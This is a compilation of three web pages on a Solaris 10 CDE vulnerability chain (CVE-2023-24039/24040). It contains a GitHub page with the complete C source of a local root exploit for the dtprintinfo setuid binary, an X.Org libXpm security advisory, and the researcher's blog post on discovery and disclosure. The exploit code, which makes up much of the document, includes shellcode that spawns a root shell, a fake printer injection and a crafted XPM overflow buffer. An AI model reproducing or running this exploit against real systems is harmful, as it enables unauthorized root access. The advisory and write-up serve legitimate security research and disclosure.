=== Content from github.com_9b1b6db9_20250114_191029.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xdea%2Fexploits%2Fblob%2Fmaster%2Fsolaris%2Fraptor_dtprintlibXmas.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xdea%2Fexploits%2Fblob%2Fmaster%2Fsolaris%2Fraptor_dtprintlibXmas.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=0xdea%2Fexploits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[0xdea](/0xdea)
/
**[exploits](/0xdea/exploits)**
Public

* [Notifications](/login?return_to=%2F0xdea%2Fexploits) You must be signed in to change notification settings
* [Fork
  114](/login?return_to=%2F0xdea%2Fexploits)
* [Star
   602](/login?return_to=%2F0xdea%2Fexploits)

* [Code](/0xdea/exploits)
* [Issues
  0](/0xdea/exploits/issues)
* [Pull requests
  0](/0xdea/exploits/pulls)
* [Actions](/0xdea/exploits/actions)
* [Projects
  0](/0xdea/exploits/projects)
* [Security](/0xdea/exploits/security)
* [Insights](/0xdea/exploits/pulse)

Additional navigation options

* [Code](/0xdea/exploits)
* [Issues](/0xdea/exploits/issues)
* [Pull requests](/0xdea/exploits/pulls)
* [Actions](/0xdea/exploits/actions)
* [Projects](/0xdea/exploits/projects)
* [Security](/0xdea/exploits/security)
* [Insights](/0xdea/exploits/pulse)

## Files

 master
## Breadcrumbs

1. [exploits](/0xdea/exploits/tree/master)
2. /[solaris](/0xdea/exploits/tree/master/solaris)
/
# raptor\_dtprintlibXmas.c

Copy path Blame  Blame
## Latest commit

## History

[History](/0xdea/exploits/commits/master/solaris/raptor_dtprintlibXmas.c)402 lines (354 loc) · 11.2 KB master
## Breadcrumbs

1. [exploits](/0xdea/exploits/tree/master)
2. /[solaris](/0xdea/exploits/tree/master/solaris)
/
# raptor\_dtprintlibXmas.c

Top
## File metadata and controls

* Code
* Blame

402 lines (354 loc) · 11.2 KB[Raw](https://github.com/0xdea/exploits/raw/refs/heads/master/solaris/raptor_dtprintlibXmas.c)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402/\* \* raptor\_dtprintlibXmas.c - Solaris 10 CDE #ForeverDay LPE \* Copyright (c) 2023 Marco Ivaldi <raptor@0xdeadbeef.info> \* \* "What has been will be again, \* what has been done will be done again; \* there is nothing new under the Sun." \* -- Ecclesiastes 1:9 \* \* "A stack-based buffer overflow in ParseColors in libXm in Common Desktop  \* Environment 1.6 can be exploited by local low-privileged users via the  \* dtprintinfo setuid binary to escalate their privileges to root on Solaris  \* 10 systems. NOTE: This vulnerability only affects products that are no  \* longer supported by the maintainer." (CVE-2023-24039) \* \* #Solaris #CDE #0day #ForeverDay #WontFix \* \* This exploit illustrates yet another way to abuse the infamous dtprintinfo \* binary distributed with the Common Desktop Environment (CDE), a veritable \* treasure trove for bug hunters since the 1990s. It's not the most reliable \* exploit I've ever written, but I'm quite proud of the new vulnerabilities \* I've unearthed in dtprintinfo with the latest Solaris patches (CPU January \* 2021) applied. The exploit chain is structured as follows: \* 1. Inject a fake printer via the printer injection bug I found in lpstat. \* 2. Exploit the stack-based buffer overflow I found in libXm ParseColors(). \* 3. Enjoy root privileges! \* \* For additional details on my bug hunting journey and on the vulnerabilities \* themselves, you can refer to the official advisory: \* https://github.com/0xdea/advisories/blob/master/HNS-2022-01-dtprintinfo.txt \* \* Usage: \* $ gcc raptor\_dtprintlibXmas.c -o raptor\_dtprintlibXmas -Wall \* $ ./raptor\_dtprintlibXmas 10.0.0.109:0 \* raptor\_dtprintlibXmas.c - Solaris 10 CDE #ForeverDay LPE \* Copyright (c) 2023 Marco Ivaldi <raptor@0xdeadbeef.info> \*  \* Using SI\_PLATFORM : i86pc (5.10) \* Using stack base : 0x8047fff \* Using safe address : 0x8045790 \* Using rwx\_mem address : 0xfeffa004 \* Using sc address : 0x8047fb4 \* Using sprintf() address : 0xfefd1250 \* Path of target binary : /usr/dt/bin/dtprintinfo \*  \* On your X11 server: \* 1. Select the "fnord" printer, then click on "Selected" > "Properties". \* 2. Click on "Find Set" and choose "/tmp/.dt/icons" from the drop-down menu. \* \* Back to your original shell: \* # id \* uid=0(root) gid=1(other) \* \* IMPORTANT NOTE. \* The buffer overflow corrupts some critical variables in memory, which we \* need to fix. In order to do so, we must patch the hostile buffer at some \* fixed locations with the first argument of the last call to ParseColors(). \* The easiest way to get such a safe address is via the special 0x41414141 \* command-line argument and truss, as follows: \* $ truss -fae -u libXm:: ./raptor\_dtprintlibXmas 10.0.0.109:0 0x41414141 2>OUT \* $ grep ParseColors OUT | tail -1 \* 29181/1@1: -> libXm:ParseColors(0x8045770, 0x3, 0x1, 0x8045724) \* ^^^^^^^^^ << this is the safe address we need \* \* Tested on: \* SunOS 5.10 Generic\_153154-01 i86pc i386 i86pc (CPU January 2021) \* [previous Solaris versions are also likely vulnerable] \*/
#include <fcntl.h>#include <link.h>#include <procfs.h>#include <stdio.h>#include <stdlib.h>#include <strings.h>#include <unistd.h>#include <sys/stat.h>#include <sys/systeminfo.h>
#define INFO1 "raptor\_dtprintlibXmas.c - Solaris 10 CDE #ForeverDay LPE"#define INFO2 "Copyright (c) 2023 Marco Ivaldi <raptor@0xdeadbeef.info>"
#define VULN "/usr/dt/bin/dtprintinfo" // vulnerable program#define DEBUG "/tmp/XXXXXXXXXXXXXXXXXX" // target for debugging#define BUFSIZE 1106 // size of hostile buffer#define PADDING 1 // hostile buffer padding#define SAFE 0x08045770 // 1st arg to ParseColors()
char sc[] = /\* Solaris/x86 shellcode (8 + 8 + 8 + 27 = 51 bytes) \*//\* triple setuid() \*/"\x31\xc0\x50\x50\xb0\x17\xcd\x91""\x31\xc0\x50\x50\xb0\x17\xcd\x91""\x31\xc0\x50\x50\xb0\x17\xcd\x91"/\* execve() \*/"\x31\xc0\x50\x68/ksh\x68/bin""\x89\xe3\x50\x53\x89\xe2\x50""\x52\x53\xb0\x3b\x50\xcd\x91";
/\* globals \*/char \*arg[2] = {"foo", NULL};char \*env[256];int env\_pos = 0, env\_len = 0;
/\* prototypes \*/int add\_env(char \*string);void check\_bad(int addr, char \*name);int get\_env\_addr(char \*path, char \*\*argv);int search\_ldso(char \*sym);int search\_rwx\_mem(void);void set\_val(char \*buf, int pos, int val);
/\* \* main() \*/int main(int argc, char \*\*argv){ char buf[BUFSIZE], cmd[1024], \*vuln = VULN; char platform[256], release[256], display[256]; int i, sc\_addr, safe\_addr = SAFE; FILE \*fp;
 int sb = ((int)argv[0] | 0xfff); // stack base int ret = search\_ldso("sprintf"); // sprintf() in ld.so.1 int rwx\_mem = search\_rwx\_mem(); // rwx memory
 /\* helper that prints argv[0] address, used by get\_env\_addr() \*/ if (!strcmp(argv[0], arg[0])) { printf("0x%p\n", argv[0]); exit(0); }
 /\* print exploit information \*/ fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);
 /\* process command line \*/ if ((argc < 2) || (argc > 3)) { fprintf(stderr, "usage: %s xserver:display [safe\_addr]\n\n", argv[0]); exit(1); } snprintf(display, sizeof(display), "DISPLAY=%s", argv[1]); if (argc > 2) { safe\_addr = (int)strtoul(argv[2], (char \*\*)NULL, 0); }
 /\* enter debug mode \*/ if (safe\_addr == 0x41414141) { unlink(DEBUG); snprintf(cmd, sizeof(cmd), "cp %s %s", VULN, DEBUG); if (system(cmd) == -1) { perror("error creating debug binary"); exit(1); } vuln = DEBUG; }
 /\* fill envp while keeping padding \*/ add\_env("LPDEST=fnord"); // injected printer add\_env("HOME=/tmp"); // home directory add\_env("PATH=/usr/bin:/bin"); // path sc\_addr = add\_env(display); // x11 display add\_env(sc); // shellcode add\_env(NULL);
 /\* calculate shellcode address \*/ sc\_addr += get\_env\_addr(vuln, argv);
 /\* inject a fake printer \*/ unlink("/tmp/.printers"); unlink("/tmp/.printers.new"); if (!(fp = fopen("/tmp/.printers", "w"))) { perror("error injecting a fake printer"); exit(1); } fprintf(fp, "fnord :\n"); fclose(fp); link("/tmp/.printers", "/tmp/.printers.new");
 /\* craft the hostile buffer \*/ bzero(buf, sizeof(buf)); for (i = PADDING; i < BUFSIZE - 16; i += 4) { set\_val(buf, i, ret); // sprintf() set\_val(buf, i += 4, rwx\_mem); // saved eip set\_val(buf, i += 4, rwx\_mem); // 1st arg set\_val(buf, i += 4, sc\_addr); // 2nd arg } memcpy(buf, "\"c c ", 5); // beginning of hostile buffer buf[912] = ' '; // string separator set\_val(buf, 1037, safe\_addr); // safe address set\_val(buf, 1065, safe\_addr); // safe address set\_val(buf, 1073, 0xffffffff); // -1
 /\* create the hostile XPM icon files \*/ system("rm -fr /tmp/.dt"); mkdir("/tmp/.dt", 0755); mkdir("/tmp/.dt/icons", 0755); if (!(fp = fopen("/tmp/.dt/icons/fnord.m.pm", "w"))) { perror("error creating XPM icon files"); exit(1); } fprintf(fp, "/\* XPM \*/\nstatic char \*xpm[] = {\n\"8 8 3 1\",\n%s", buf); fclose(fp); link("/tmp/.dt/icons/fnord.m.pm", "/tmp/.dt/icons/fnord.l.pm"); link("/tmp/.dt/icons/fnord.m.pm", "/tmp/.dt/icons/fnord.t.pm");
 /\* print some output \*/ sysinfo(SI\_PLATFORM, platform, sizeof(platform) - 1); sysinfo(SI\_RELEASE, release, sizeof(release) - 1); fprintf(stderr, "Using SI\_PLATFORM\t: %s (%s)\n", platform, release); fprintf(stderr, "Using stack base\t: 0x%p\n", (void \*)sb); fprintf(stderr, "Using safe address\t: 0x%p\n", (void \*)safe\_addr); fprintf(stderr, "Using rwx\_mem address\t: 0x%p\n", (void \*)rwx\_mem); fprintf(stderr, "Using sc address\t: 0x%p\n", (void \*)sc\_addr); fprintf(stderr, "Using sprintf() address\t: 0x%p\n", (void \*)ret); fprintf(stderr, "Path of target binary\t: %s\n\n", vuln);
 /\* check for badchars \*/ check\_bad(safe\_addr, "safe address"); check\_bad(rwx\_mem, "rwx\_mem address"); check\_bad(sc\_addr, "sc address"); check\_bad(ret, "sprintf() address");
 /\* run the vulnerable program \*/ execve(vuln, arg, env); perror("execve"); exit(0);}
/\* \* add\_env(): add a variable to envp and pad if needed \*/int add\_env(char \*string){ int i;
 /\* null termination \*/ if (!string) { env[env\_pos] = NULL; return env\_len; }
 /\* add the variable to envp \*/ env[env\_pos] = string; env\_len += strlen(string) + 1; env\_pos++;
 /\* pad envp using zeroes \*/ if ((strlen(string) + 1) % 4) for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env\_pos++) { env[env\_pos] = string + strlen(string); env\_len++; }
 return env\_len;}
/\* \* check\_bad(): check an address for the presence of badchars \*/void check\_bad(int addr, char \*name){ int i, bad[] = {0x00, 0x09, 0x20}; // NUL, HT, SP
 for (i = 0; i < sizeof(bad) / sizeof(int); i++) { if (((addr & 0xff) == bad[i]) ||  ((addr & 0xff00) == bad[i]) || ((addr & 0xff0000) == bad[i]) ||  ((addr & 0xff000000) == bad[i])) { fprintf(stderr, "error: %s contains a badchar\n", name); exit(1); } }}
/\* \* get\_env\_addr(): get environment address using a helper program \*/int get\_env\_addr(char \*path, char \*\*argv){ char prog[] = "./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; char hex[11]; int fd[2], addr;
 /\* truncate program name at correct length and create a hard link \*/ prog[strlen(path)] = '\0'; unlink(prog); link(argv[0], prog);
 /\* open pipe to read program output \*/ if (pipe(fd) == -1) { perror("pipe"); exit(1); }
 switch(fork()) {
 case -1: /\* cannot fork \*/ perror("fork"); exit(1);
 case 0: /\* child \*/ dup2(fd[1], 1); close(fd[0]); close(fd[1]); execve(prog, arg, env); perror("execve"); exit(1);
 default: /\* parent \*/ close(fd[1]); read(fd[0], hex, sizeof(hex)); break; }
 /\* check address \*/ if (!(addr = (int)strtoul(hex, (char \*\*)NULL, 0))) { fprintf(stderr, "error: cannot read address from helper\n"); exit(1); }
 return addr + strlen(arg[0]) + 1;}
/\* \* search\_ldso(): search for a symbol inside ld.so.1 \*/int search\_ldso(char \*sym){ int addr; void \*handle; Link\_map \*lm;
 /\* open the executable object file \*/ if ((handle = dlmopen(LM\_ID\_LDSO, NULL, RTLD\_LAZY)) == NULL) { perror("dlopen"); exit(1); }
 /\* get dynamic load information \*/ if ((dlinfo(handle, RTLD\_DI\_LINKMAP, &lm)) == -1) { perror("dlinfo"); exit(1); }
 /\* search for the address of the symbol \*/ if ((addr = (int)dlsym(handle, sym)) == NULL) { fprintf(stderr, "sorry, function %s() not found\n", sym); exit(1); }
 /\* close the executable object file \*/ dlclose(handle);
 return addr;}
/\* \* search\_rwx\_mem(): search for an RWX memory segment valid for all \* programs (typically, /usr/lib/ld.so.1) using the proc filesystem \*/int search\_rwx\_mem(void){ int fd; char tmp[16]; prmap\_t map; int addr = 0, addr\_old;
 /\* open the proc filesystem \*/ sprintf(tmp,"/proc/%d/map", (int)getpid()); if ((fd = open(tmp, O\_RDONLY)) < 0) { fprintf(stderr, "can't open %s\n", tmp); exit(1); }
 /\* search for the last RWX memory segment before stack (last - 1) \*/ while (read(fd, &map, sizeof(map))) if (map.pr\_vaddr) if (map.pr\_mflags & (MA\_READ | MA\_WRITE | MA\_EXEC)) { addr\_old = addr; addr = map.pr\_vaddr; } close(fd);
 /\* add 4 to the exact address NUL bytes \*/ if (!(addr\_old & 0xff)) addr\_old |= 0x04; if (!(addr\_old & 0xff00)) addr\_old |= 0x0400;
 return addr\_old;}
/\* \* set\_val(): copy a dword inside a buffer (little endian) \*/void set\_val(char \*buf, int pos, int val){ buf[pos] = (val & 0x000000ff); buf[pos + 1] = (val & 0x0000ff00) >> 8; buf[pos + 2] = (val & 0x00ff0000) >> 16; buf[pos + 3] = (val & 0xff000000) >> 24;}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.x.org_d2aa7a47_20250115_113940.html ===

# X.Org Security Advisory: Issues handling XPM files in libXpm prior to 3.5.15

**Alan Coopersmith**
alan.coopersmith at oracle.com

*Tue Jan 17 16:41:00 UTC 2023*

* Previous message (by thread): [[ANNOUNCE] igt-gpu-tools 1.27](003311.html)
* Next message (by thread): [[ANNOUNCE] libXpm 3.5.15](003313.html)
* **Messages sorted by:**
  [[ date ]](date.html#3312)
  [[ thread ]](thread.html#3312)
  [[ subject ]](subject.html#3312)
  [[ author ]](author.html#3312)

---

```
X.Org Security Advisory:  January 17, 2023

Issues handling XPM files in libXpm prior to 3.5.15
===================================================

Three issues have been found in the libXpm library code to read XPM files
in libXpm 3.5.14 and earlier releases.

1) CVE-2022-46285: Infinite loop on unclosed comments

When reading XPM images from a file with libXpm 3.5.14 or older, if a
comment in the file is not closed (i.e. a C-style comment starts with
"/*" and is missing the closing "*/"), the ParseComment() function will
loop forever calling getc() to try to read the rest of the comment,
failing to notice that it has returned EOF, which may cause a denial of
service to the calling program.

This issue was found by Marco Ivaldi of the Humanativa Group's HN Security team.

The fix is provided in
<https://gitlab.freedesktop.org/xorg/lib/libxpm/-/commit/a3a7c6dcc3b629d7650148>

2) CVE-2022-44617: Runaway loop on width of 0 and enormous height

When reading XPM images from a file with libXpm 3.5.14 or older, if a
image has a width of 0 and a very large height, the ParsePixels() function
will loop over the entire height calling getc() and ungetc() repeatedly,
or in some circumstances, may loop seemingly forever, which may cause a denial
of service to the calling program when given a small crafted XPM file to parse.

This issue was found by Martin Ettl.

The fix is provided in
<https://gitlab.freedesktop.org/xorg/lib/libxpm/-/commit/f80fa6ae47ad4a5beacb28>
and
<https://gitlab.freedesktop.org/xorg/lib/libxpm/-/commit/c5ab17bcc34914c0b0707d>

3) CVE-2022-4883: compression commands depend on $PATH

By default, on all platforms except MinGW, libXpm will detect if a filename
ends in .Z or .gz, and will when reading such a file fork off an uncompress
or gunzip command to read from via a pipe, and when writing such a file will
fork off a compress or gzip command to write to via a pipe.

In libXpm 3.5.14 or older these are run via execlp(), relying on $PATH
to find the commands.  If libXpm is called from a program running with
raised privileges, such as via setuid, then a malicious user could set
$PATH to include programs of their choosing to be run with those privileges.

This issue was found by Alan Coopersmith of the Oracle Solaris team.

The fix is provided in
<https://gitlab.freedesktop.org/xorg/lib/libxpm/-/commit/515294bb8023a45ff91669>
and
<https://gitlab.freedesktop.org/xorg/lib/libxpm/-/commit/8178eb0834d82242e1edbc>

libXpm 3.5.15 includes fixes for all three of these issues.  It also adds
a new configure option --disable-open-zfile that makes it easy for people
building libXpm to completely disable the code to fork compression and
uncompression programs if they do not have a need for it in their use case.

X.Org thanks all of those who reported and fixed these issues, and those
who helped with the review and release of this advisory and these fixes.

The X.Org security team would like to take this opportunity to remind X client
authors that current best practices suggest separating code that requires
privileges from the GUI, to reduce the risk of issues like CVE-2022-4883.

--
     -Alan Coopersmith-              [alan.coopersmith at oracle.com](https://lists.x.org/mailman/listinfo/xorg-announce)
       X.Org Security Response Team - [xorg-security at lists.x.org](https://lists.x.org/mailman/listinfo/xorg-announce)
-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 819 bytes
Desc: not available
URL: <<https://lists.x.org/archives/xorg-announce/attachments/20230117/09138ec0/attachment.sig>>

```

---

* Previous message (by thread): [[ANNOUNCE] igt-gpu-tools 1.27](003311.html)
* Next message (by thread): [[ANNOUNCE] libXpm 3.5.15](003313.html)
* **Messages sorted by:**
  [[ date ]](date.html#3312)
  [[ thread ]](thread.html#3312)
  [[ subject ]](subject.html#3312)
  [[ author ]](author.html#3312)

---

[More information about the xorg-announce
mailing list](https://lists.x.org/mailman/listinfo/xorg-announce)



=== Content from security.humanativaspa.it_34b6e6fd_20250114_191031.html ===


[![Humanativa](https://security.humanativaspa.it/sec/wp-content/themes/master-am/images/hn-security-logo.png)](https://security.humanativaspa.it/)

* + [Home](https://security.humanativaspa.it/ "Home")
  + [About Us](https://security.humanativaspa.it/#aboutus "About Us")
  + [Services](https://security.humanativaspa.it/#services "Services")
  + [Blog](https://security.humanativaspa.it/category/news/ "Blog")

Contacts

### Contacts

If you're looking to fortify your security and take your defenses to the next level, contact us at info@hnsecurity.it to explore how HN Security can help safeguard your digital assets.

Posted on [18 January 202321 January 2023](https://security.humanativaspa.it/nothing-new-under-the-sun/) Marco Ivaldi
### Nothing new under the Sun – Discovering and exploiting a CDE bug chain

> *“What has been will be again,*
>
> *what has been done will be done again;*
>
> *there is nothing new under the Sun.”*
>
> *— Ecclesiastes 1:9*

### TL;DR

We have identified multiple security vulnerabilities that are exploitable via the the setuid-root **dtprintinfo** binary from the Common Desktop Environment (CDE) distributed with **Oracle Solaris 10**:

* A bug in the parser of the lpstat external command invoked by dtprintinfo to list the names of available printers allows low-privileged local users to **inject arbitrary printer names**.
* This printer name injection allows low-privileged local users to manipulate the control flow of the target program and **disclose memory contents**.
* The ability to inject arbitrary printer names opens other attack vectors: as an example, we discovered **multiple icon parsing bugs** in the Motif library libXm that cause memory corruption.

We demonstrated the possibility to chain together the printer name injection bug and a stack-based buffer overflow in libXm to achieve **local privilege escalation to root on a fully-patched Solaris 10 system**.

Our detailed **advisory** is available here: <https://github.com/hnsecurity/vulns/blob/main/HNS-2022-01-dtprintinfo.txt>

Our proof-of-concept **exploit** is here: <https://github.com/0xdea/exploits/blob/master/solaris/raptor_dtprintlibXmas.c>

### Discovery

Following our last CDE [vulnerability disclosures](https://github.com/0xdea/raptor_infiltrate20), Oracle kindly shared with us a copy of their then current **Solaris 10 security patch set** (CPU January 2021), so that we could install it in our lab and verify the fixes for the bugs we had reported.

In addition to verifying these fixes, we decided to take a closer look at the **dtprintinfo** program distributed with CDE, because of its complexity and its impressive [historical record](https://www.exploit-db.com/search?q=dtprintinfo) of high-impact vulnerabilities.

After fruitlessly spending a few days reversing and auditing the patched version of dtprintinfo, we came up with the idea of using the **poor man’s fuzzer** below to quickly check for the presence of flaws in the parsing of the $HOME/.printers file:

```
$ cat /dev/urandom > ~/.printers
^C
```

Indeed, this led to immediate results. It turns out that it is possible to **inject fake printers** to be displayed by dtprintinfo. In addition, by manipulating the injected printer names, we were able to trigger an out-of-bound read and **disclose partial heap memory contents** of our target setuid-root binary. Check out the [advisory](https://github.com/hnsecurity/vulns/blob/main/HNS-2022-01-dtprintinfo.txt) for a detailed analysis of these two bugs.

Being able to inject arbitrary printer names is significant also because it opens other attack vectors that otherwise would not be available on systems without configured printers. One such vector we thought that was worth exploring is the **parsing of printer icons** in the [XPM format](https://www.xfree86.org/current/xpm.pdf). A low-privileged local user can supply his or her own icons for dtprintinfo to show by placing them in the $HOME/.dt/icons directory and selecting them in the X11 GUI. A bug in the XPM parser could easily lead to memory corruption and privilege escalation. To prove our point, we built a rudimentary **mutation fuzzer** written in Python and we unearthed a few icon parsing bugs in the **libXm library** used by CDE, originally part of the [Motif toolkit](http://www.opengroup.org/desktop/motif.html). Check out the [advisory](https://github.com/hnsecurity/vulns/blob/main/HNS-2022-01-dtprintinfo.txt) for additional details.

After our brief but intense artisanal fuzzing experience, it was time to go back to **static analysis** for a short while, specifically targeting the apparently weak libXm library parser. We fired up our [Rhabdomancer](https://github.com/0xdea/ghidra-scripts/blob/main/Rhabdomancer.java) Ghidra script to quickly find locations in the library where dangerous API functions are called, using them as starting points for our binary audit. Among some interesting candidate points, the following one stood up, in the familiar **ParseColors()** function that we had already encountered while analyzing the crashes produced by our XPM fuzzer:

```
int ParseColors(int *data, uint ncolors, uint cpp, undefined4
        *colorTablePtr, undefined4 hashtable)
{
    ...
    char local_83c[1024];
    char local_43c[1024];
    ...
    local_c = _XmxpmNextWord(local_34, local_83c, 0x400);
    ...
    local_83c[local_c] = '\0';
    strcat(local_43c, local_83c); /* VULN */
}
```

A perfect specimen of **stack-based buffer overflow**, caused by the reckless use of the insecure API function strcat(). This vulnerability can be triggered via a specially crafted XPM icon with long color strings.

### Exploitation

We have created a **proof-of-concept exploit** that chains together the printer name injection bug and the stack-based buffer overflow we have identified in libXm. It allows a low-privileged local user to escalate his or her privileges to those of the root user on Intel-based Solaris 10 systems with the latest patches installed (tested on CPU January 2021).

The [exploit code](https://github.com/0xdea/exploits/blob/master/solaris/raptor_dtprintlibXmas.c) is extensively commented and should be self-explanatory. Here it is in action.

[![](https://security.humanativaspa.it/sec/wp-content/uploads/2022/01/dtprintlibXmas.gif)](https://security.humanativaspa.it/sec/wp-content/uploads/2022/01/dtprintlibXmas.gif)

### Disclosure and Fix

The disclosure timeline spans exactly one year:

* **2022-01-18**: Oracle was notified via <secalert\_us@oracle.com>.
* **2022-01-19**: Oracle acknowledged our vulnerability reports.
* **2022-04-20**: Asked Oracle to provide an update on the patch release date.
* **2022-04-21**: Oracle replied they could not comment on the patch release date.
* **2022-09-03**: Asked Oracle for an update and informed them of our plan to publish a detailed advisory and a blog post before the end of 2022.
* **2022-09-12**: Oracle replied they are working on the bugs and will be able to give an update closer to the next CPU, scheduled for October.
* **2022-10-18**: Oracle informed us that the vulnerabilities will be fixed in their CPU of January 2023.
* **2022-12-20**: With a surprise move, Oracle informed us that Solaris 10 desktop components have reached EOL and are no longer supported. Therefore, Oracle will not be releasing patches for bugs affecting Solaris 10. They will work with X.Org to get a fix and an advisory released upstream for the first crash we identified in libXm, which also affects X.Org libXpm. This denial of service bug will be fixed in Solaris 11.4. As a final note, it appears that the buffer overflows we discovered in ParsePixels() and ParseColors() were already [reported](https://security.appspot.com/security/CESA-2004-003.txt) by Chris Evans in 2004 and tracked as [CVE-2004-0687](https://nvd.nist.gov/vuln/detail/CVE-2004-0687). Due to an incomplete fix, they were not patched in Solaris 10 and have survived in the code for 19 years! Since no patches for Solaris 10 will be released, these issues have officially become [#ForeverDay](https://www.schneier.com/blog/archives/2012/04/forever-day_bug.html) bugs.
* **2023-01-17**: X.Org released libXpm 3.5.15, which fixes [CVE-2022-46285](https://nvd.nist.gov/vuln/detail/CVE-2022-46285) (infinite loop on unclosed comments in X.Org libXpm). Oracle published their CPU January 2023, which unfortunately does not include fixes for our bugs that affect Solaris 10.
* **2023-01-18**: Oracle informed us that Solaris 10 desktop components have reached EOL at the end of 2019. EOL is documented in [support note 1400676.1](https://support.oracle.com/knowledge/Sun%20Microsystems/1400676_1.html), behind the paywall for Oracle’s customers with current support contracts. [HN Security](https://security.humanativaspa.it/) published this [advisory](https://github.com/hnsecurity/vulns/blob/main/HNS-2022-01-dtprintinfo.txt) and a local privilege escalation [exploit](https://github.com/0xdea/exploits/blob/master/solaris/raptor_dtprintlibXmas.c).
* **2023-01-20**: Mitre has assigned [CVE-2023-24039](https://nvd.nist.gov/vuln/detail/CVE-2023-24039) to the buffer overflow in libXm and [CVE-2023-24040](https://nvd.nist.gov/vuln/detail/CVE-2023-24040) to the printer name injection and heap memory disclosure bugs.

See the [advisory](https://github.com/hnsecurity/vulns/blob/main/HNS-2022-01-dtprintinfo.txt) for remediation advice, including a partial workaround.

# Blog Categories * [Articles](https://security.humanativaspa.it/category/articles/) * [Events](https://security.humanativaspa.it/category/events/) * [Exploits](https://security.humanativaspa.it/category/exploits/) * [News](https://security.humanativaspa.it/category/news/) * [Servizi](https://security.humanativaspa.it/category/servizi/) * [Tools](https://security.humanativaspa.it/category/tools/) * [Vulnerabilities](https://security.humanativaspa.it/category/vulnerabilities/)

## Tags

[0day](https://security.humanativaspa.it/tag/0day/%20)
[active directory](https://security.humanativaspa.it/tag/active-directory/%20)
[advisory](https://security.humanativaspa.it/tag/advisory/%20)
[analytics](https://security.humanativaspa.it/tag/analytics/%20)
[android](https://security.humanativaspa.it/tag/android/%20)
[apache](https://security.humanativaspa.it/tag/apache/%20)
[ARM](https://security.humanativaspa.it/tag/arm/%20)
[assemblies](https://security.humanativaspa.it/tag/assemblies/%20)
[atdcm64a](https://security.humanativaspa.it/tag/atdcm64a/%20)
[attacks](https://security.humanativaspa.it/tag/attacks/%20)
